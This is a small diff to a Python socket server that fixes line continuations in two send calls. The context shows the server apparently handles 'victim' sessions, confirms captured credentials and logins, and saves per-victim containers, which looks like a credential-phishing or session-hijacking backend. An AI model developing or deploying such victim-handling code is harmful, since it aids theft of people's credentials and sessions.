@@ -134,7 +134,7 @@ class SocketServer():
                             self.sessions[SID]["authm"] = None
                             self.log("Victim with SID", SID, "and BID", 
                                 self.sessions[SID]["bid"], "reconnected")
-                            await self.sessions[SID]["victim"]
+                            await self.sessions[SID]["victim"] \
                                 .send(json.dumps({"status":"validCreds"}));
                             continue
 
@@ -207,7 +207,7 @@ class SocketServer():
                         bid = data["bid"]
                         name = self.sessions[SID]["user"]
 
-                        await self.sessions[SID]["victim"]
+                        await self.sessions[SID]["victim"] \
                             .send(json.dumps({"status":"loggedIn"}));
 
                         self.save_container(name, bid)
